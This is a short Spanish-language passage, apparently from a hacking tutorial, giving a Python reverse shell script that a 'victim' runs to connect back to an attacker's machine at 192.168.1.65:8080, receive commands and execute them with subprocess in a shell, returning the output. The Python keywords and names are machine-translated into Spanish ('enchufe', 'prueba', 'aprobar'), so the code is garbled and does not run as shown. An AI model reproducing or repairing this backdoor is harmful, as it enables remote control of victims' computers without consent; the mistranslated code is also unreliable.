## Esto será el script que tiene que ejecutar la víctima para enviarle al atacante la shell reversa:

 enchufe de importación
 subproceso de importación

cliente = enchufe . enchufe ()
prueba :
    cliente _ connect (( '192.168.1.65' , 8080 )) # Volvemos a poner la IP de nuestra máquina atacante donde se conectará a la víctima.
    cliente _ enviar ( "1" . codificar ( "ascii" ))

    mientras que  es cierto :
        comandoBytes = cliente . recibo ( 1024 )
        comandoCodificado = comandoBytes . decodificar ( "ascii" )
        comando = subproceso . Popen ( comandoCodificado , shell = True , stdout = subproceso . PIPE , stderr = subproceso . PIPE )
        cliente _ enviar ( comando . stdout . leer ())
excepto :
    aprobar
